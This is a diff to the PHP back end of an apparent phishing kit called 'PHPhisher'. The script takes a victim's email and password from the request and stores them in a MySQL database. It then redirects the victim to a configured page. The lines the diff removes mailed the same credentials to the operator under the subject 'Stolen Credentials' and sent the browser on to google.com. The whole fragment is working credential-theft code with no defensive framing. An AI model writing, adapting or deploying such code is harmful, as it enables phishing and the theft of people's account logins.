@@ -7,8 +7,7 @@ $dbname = $json['dbname'];
 $redirect = $json['page-redirect'];
 $password = $_GET['password'];
 $email = $_GET['email'];
-switch ($json['page']) {
-    case "1": 
+header("Location: $redirect");
 	try {
     $conn = new PDO("mysql:host=$servername;dbname=$dbname", $dbuser, $dbpass);
     // set the PDO error mode to exception
@@ -25,16 +24,4 @@ switch ($json['page']) {
     echo $sql . "<br>" . $e->getMessage();
     }
 	$conn = null;
-	break;
-    case "2": 
-	$subject ="Stolen Credentials";
-	$message="Email: $email \nPassword: $password";
-	$header="from: PHPhisher";
-	$to = $json['email'];
-	mail($to,$subject,$message,$header);
-	break;
-}
-echo '<script script type="text/javascript">';
-echo 'window.location.href = "http://google.com";'; 
-echo '</script>';
 ?>
